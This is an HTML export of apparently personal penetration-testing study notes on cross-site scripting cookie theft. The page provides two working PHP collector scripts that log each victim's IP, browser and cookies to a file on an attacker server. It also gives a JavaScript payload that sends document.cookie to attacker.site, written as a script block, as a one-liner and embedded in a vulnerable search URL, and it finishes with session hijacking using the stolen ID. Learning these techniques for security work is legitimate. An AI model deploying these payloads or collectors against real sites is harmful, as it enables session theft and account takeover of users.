<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>example: steal cookies without an alert message</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>example: steal cookies without an alert message</h1><br/>Firefox extensions may help a lot in testing how the Cookies mechanism works in a Website<br /><a href="https://addons.mozilla.org/en-US/firefox/addon/3829">Live HTTP Header</a>: helps understanding WHEN the cookie is being sent<br /><a href="https://addons.mozilla.org/en-US/firefox/addon/4510">Cookie Editor</a>: shows the installed cookies and the &lt;domain,path,expiration&gt; parameters<br /><br /><br /><strong><h3>get.php (http://attacker.site/get.php)</h3></strong><br />First thing we need a web page as Attacker that we own(in our example <strong>get.php</strong>) that is able to:<br />1. accept the request from the vulnerable site<br />2. retrieve the cookies and store them in a file in the attacker server<br />We will save the stolen cookies in the file jar.txt that will be passed(see that in the next paragraph javascript payload) by <code>i.src=&quot;http://your.site/get.php?cookies=&quot;+document.cookie;</code><br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">&lt;?php</span><br /><span style="color:#ff9d00;font-weight:700">print(</span><span style="color:#3ad900;font-weight:400">&quot;we store the cookies in the file jar.txt:\n\n&quot;</span><span style="color:#ff9d00;font-weight:400">);</span><br /><span style="color:#333333;font-weight:400">$ip</span> <span style="color:#ff9d00;font-weight:400">=</span> <span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">&#39;REMOTE_ADDR&#39;</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br /><span style="color:#333333;font-weight:400">$browser</span> <span style="color:#ff9d00;font-weight:400">=</span> <span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">&#39;HTTP_USER_AGENT&#39;</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br /><br /><span style="color:#333333;font-weight:400">$fp</span> <span style="color:#ff9d00;font-weight:400">=</span> fopen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">&#39;jar.txt&#39;</span><span style="color:#ff9d00;font-weight:400">,</span> <span style="color:#3ad900;font-weight:400">&#39;a&#39;</span><span style="color:#ff9d00;font-weight:400">);</span><br /><br />fwrite<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$fp</span><span style="color:#ff9d00;font-weight:400">,</span> <span style="color:#333333;font-weight:400">$ip</span><span style="color:#ff9d00;font-weight:400">.</span><span style="color:#3ad900;font-weight:400">&#39; &#39;</span><span style="color:#ff9d00;font-weight:400">.</span><span style="color:#333333;font-weight:400">$browser</span><span style="color:#ff9d00;font-weight:400">.</span><span style="color:#3ad900;font-weight:400">&quot; \n&quot;</span><span style="color:#ff9d00;font-weight:400">);</span><br />fwrite<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$fp</span><span style="color:#ff9d00;font-weight:400">,</span> urldecode<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">&#39;QUERY_STRING&#39;</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">).</span> <span style="color:#3ad900;font-weight:400">&quot;\n\n&quot;</span><span style="color:#ff9d00;font-weight:400">);</span><br />fclose<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$fp</span><span style="color:#ff9d00;font-weight:400">);</span><br /><span style="color:#333333;font-weight:400">?&gt;</span><br /></pre></div><br />or a simpler version<br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">&lt;?php</span><br /><span style="color:#333333;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">&quot;/tmp/jar.txt&quot;</span><span style="color:#ff9d00;font-weight:400">;</span><br /><span style="color:#333333;font-weight:400">$fp</span><span style="color:#ff9d00;font-weight:400">=</span>fopen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:400">,</span> <span style="color:#3ad900;font-weight:400">&#39;a&#39;</span><span style="color:#ff9d00;font-weight:400">);</span><br /><span style="color:#333333;font-weight:400">$cookie</span><span style="color:#ff9d00;font-weight:400">=</span><span style="color:#333333;font-weight:400">$_GET[</span><span style="color:#3ad900;font-weight:400">&#39;id&#39;</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br />fwrite<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$fp</span><span style="color:#ff9d00;font-weight:400">,</span> <span style="color:#333333;font-weight:400">$cookie</span><span style="color:#ff9d00;font-weight:400">);</span><br />fclose<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$fp</span><span style="color:#ff9d00;font-weight:400">);</span><br /><span style="color:#333333;font-weight:400">?&gt;</span><br /></pre></div><br /><br /><strong><h3>javascript payload </h3></strong><br />Payload that we have inject in the website with a form or something similar<br />This payload create new image object and set the address of the image to our website link.<br />With this simple code we trick the victim browser to request our webpage and send to it the cookies<br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:400">&lt;script&gt;</span><br /><span style="color:#ff9d00;font-weight:700">var</span> i = <span style="color:#ff9d00;font-weight:700">new</span> Image();<br />i.src=<span style="color:#3ad900;font-weight:400">&quot;http://attacker.site/get.php?cookies=&quot;</span>+document.cookie;<br /><span style="color:#7f0044;font-weight:400">&lt;/script&gt;</span></pre></div><br />that in a single line would be<br />    <div class="codebox"><pre>&lt;script&gt;var i=new Image();i.src=&quot;http://attacker.site/get.php?cookies=&quot;+document.cookie;&lt;/script&gt;</pre></div><br />That in a url would be:<br />    <div class="codebox"><pre>http://www.example.com/members/search.php?kw=&lt;script&gt;var i=new Image();i.src=&quot;http://attacker.site/get.php?cookies=&quot;+document.cookie;&lt;/script&gt;</pre></div><br />Now we put in place our plan, first we need to go to the vulnerable website and paste our javascript code<br /><a href=""><img src="images/340-1.png" alt="images/340-1.png" /></a><br /><br />Stolen cookies in the jar.txt file in our website<br /><a href=""><img src="images/340-2.png" alt="images/340-2.png" /></a><br /><br />now that we have stolen the sessionID we can change it an acces like another user <br /><a href="file://G:/Other computers/Yoga 520/CherryTree/screenshot/Web Application Attacks/XSS4.png"><img src="images/340-3.png" alt="images/340-3.png" /></a></div>
</body>
</html>
